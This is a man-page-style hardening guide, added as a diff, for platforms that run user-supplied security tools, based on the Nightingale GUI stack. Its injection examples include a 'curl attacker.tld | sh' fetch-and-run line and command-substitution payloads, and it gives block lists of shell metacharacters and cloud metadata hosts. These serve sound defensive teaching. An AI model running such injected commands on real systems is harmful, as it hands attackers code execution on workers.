@@ -1,0 +1,179 @@
+CMDHARDENING(7)           Miscellaneous Information Manual          CMDHARDENING(7)
+
+NAME
+       cmdhardening - harden platforms that execute user-supplied security
+       tool commands without handing attackers a shell
+
+DESCRIPTION
+       If you build a pentest platform, CTF lab, scan orchestrator, or
+       "AI that runs nmap for you," you eventually face the same design
+       problem: users must run powerful tools, and powerful tools are one
+       metacharacter away from arbitrary code execution on your worker.
+
+       Validation regexes feel safe until someone sends Unicode escapes,
+       env sh -c, or a second channel that never passes through your
+       validator.  This article captures lessons from hardening the
+       Nightingale GUI stack — Go WebSocket terminal, RabbitMQ scan
+       workers, and service-to-service auth — into patterns you can apply
+       to any tool runner.
+
+   The wrong default: sh -c with user strings
+       The naive worker looks like:
+
+              cmd := exec.Command("sh", "-c", userInput)
+              cmd.Run()
+
+       Every shell metacharacter becomes an injection primitive:
+
+              nmap -sV ; curl attacker.tld | sh
+              nmap $(curl …)
+              nmap `id`
+              nmap -oN /etc/passwd   # path abuse, different class
+
+       If your product needs interactive reverse shells and exploit
+       interpreters, you cannot "filter all danger" at the PTY layer.
+       You must decide which surfaces are filtered commands and which
+       are confined interactive sessions — and isolate the latter.
+
+   Pattern 1 — Whitelist tools, execute argv
+       For job-style scans (nuclei, nmap, amass), do not invoke a shell.
+
+       1. Allowlist the tool name
+              map[string]bool{"nmap": true, "nuclei": true, "amass": true,
+              "nikto": true, …}
+
+       2. Resolve to an absolute binary path you control
+              toolPath := "/usr/local/bin/nmap"
+
+       3. Split arguments yourself
+              exec.Command(toolPath, args...)
+
+       4. Reject shell metacharacters in args even so
+              ; & | ` $ ( ) < > newlines, and friends — defense in depth
+              in case a future caller reintroduces sh -c.
+
+       Nightingale duplicates validation in the Next.js API and the Go
+       backend so a single buggy layer cannot authorize a bad job.
+
+   Pattern 2 — validateCommand is necessary but not sufficient
+       A practical validator checks:
+
+       •  Non-empty, length-capped commands (e.g. max 4096)
+       •  Dangerous patterns: ; && || | ` $( ${ >> <<
+       •  Unicode / hex escape attempts (\u \x)
+       •  Dangerous builtins and shell names as tokens: exec, eval,
+          source, bash, sh, zsh
+       •  Unexpected /bin/* execution outside a small allowlist
+
+       Still assume bypasses exist.  Unicode normalization, obscure IFS
+       tricks, and alternate execution helpers (env, find -exec, awk)
+       keep appearing.  Treat the validator as a seatbelt, not the airbag.
+
+       The airbag is: no shell, argv exec, tool allowlist, and host
+       isolation.
+
+   Pattern 3 — Know which channel bypasses your filter
+       Interactive products often have:
+
+       EXECUTE_COMMAND
+              Passes through validateCommand — good place for filters.
+
+       SEND_INPUT
+              Raw bytes to an existing PTY — filters never see them.
+              Required for real pentest workflows (python exploits,
+              reverse shells).  Document this as accepted risk.
+
+       If SEND_INPUT exists, confinement must move to:
+
+       •  Per-session UID / dedicated user
+       •  Network policy (no metadata IPs, no cloud IMDS)
+       •  Container or VM boundary per tenant
+       •  No docker.sock mounted into the workload
+
+       Filtering commands while sharing a rootful Docker socket with the
+       backend is security theater.
+
+   Pattern 4 — Block cloud metadata as a scan target
+       Tool runners love SSRF-shaped accidents.  Maintain a deny list
+       of metadata hosts and link-local addresses:
+
+              169.254.169.254
+              metadata.google.internal
+              metadata.azure.com
+              100.100.100.200
+              localhost (for scan jobs that should not hit the control plane)
+
+       Validate the target host after URL parsing, not with naive string
+       contains alone.
+
+   Pattern 5 — Time-based HMAC for service-to-service auth
+       Static shared Bearer tokens between workers and APIs leak through
+       logs and crash dumps.  Per-request unique secrets race with
+       retries.
+
+       A workable middle ground used in Nightingale:
+
+       •  Derive secret = HMAC-SHA256(base, time_window)
+       •  Rotate on a fixed window (for example 15 minutes)
+       •  Accept current and previous window (overlap) to survive skew
+       •  Send as X-Internal-Secret on internal routes only
+
+       Combine with JWT auth on user WebSockets that rejects non-HMAC
+       signing methods (block alg=none / algorithm confusion).
+
+   Pattern 6 — Never mount raw docker.sock for VPN helpers
+       CTF VPN containers (HTB / THM style) tempt you to let the API
+       talk to Docker directly.  Prefer a docker-socket-proxy that
+       exposes only the verbs you need, on an internal network, with
+       the backend never holding unrestricted socket access.
+
+   Pattern 7 — Learn from your own red team notes
+       When you red-team your runner, write down chains honestly:
+
+       •  Which control was bypassed?
+       •  Was the bypass by design (interactive PTY)?
+       •  What confinement should have limited blast radius?
+
+       Product security for tool platforms is mostly confinement
+       engineering once interactive shells are in scope.
+
+   Checklist before you ship a tool runner
+       [ ] Jobs use exec.Command(tool, args...), not sh -c
+       [ ] Tool names are allowlisted; paths are absolute
+       [ ] Args reject metacharacters; length limits enforced
+       [ ] Targets cannot be cloud metadata / link-local
+       [ ] Interactive PTY is isolated per tenant / UID
+       [ ] No unrestricted docker.sock in the API container
+       [ ] Internal APIs use rotating HMAC (or mTLS), not static tokens
+       [ ] User WebSocket auth validates algorithm and expiry
+       [ ] Same validation exists at API edge and worker
+       [ ] You have tests that try ; && $( ) ` env sh -c
+
+NOTES
+       •  Prompt injection against an AI agent that shells out is the
+          same bug class.  See aiharness(7).
+
+       •  CTF agents that use shell=True with "TODO: sanitize" are
+          teaching the wrong lesson.  Copy the whitelist/argv pattern
+          instead.
+
+       •  Removing unused packages from the worker image (freerdp,
+          stale GUI libs) is also command-hardening: less CVE surface
+          for the same argv you already allow.
+
+SEE ALSO
+       aiharness(7), exec(3), nmap(1), docker-socket-proxy
+
+       Nightingale (OWASP):
+       ⟨https://github.com/RAJANAGORI/Nightingale⟩
+
+       Nightingale GUI:
+       ⟨https://github.com/RAJANAGORI/Nightingale-GUI⟩
+
+       Hosted product:
+       ⟨https://nightingale-security.com/⟩
+
+COLOPHON
+       This page describes practical hardening for platforms that execute
+       security tools on behalf of users, drawn from Nightingale GUI
+       worker and terminal security work.
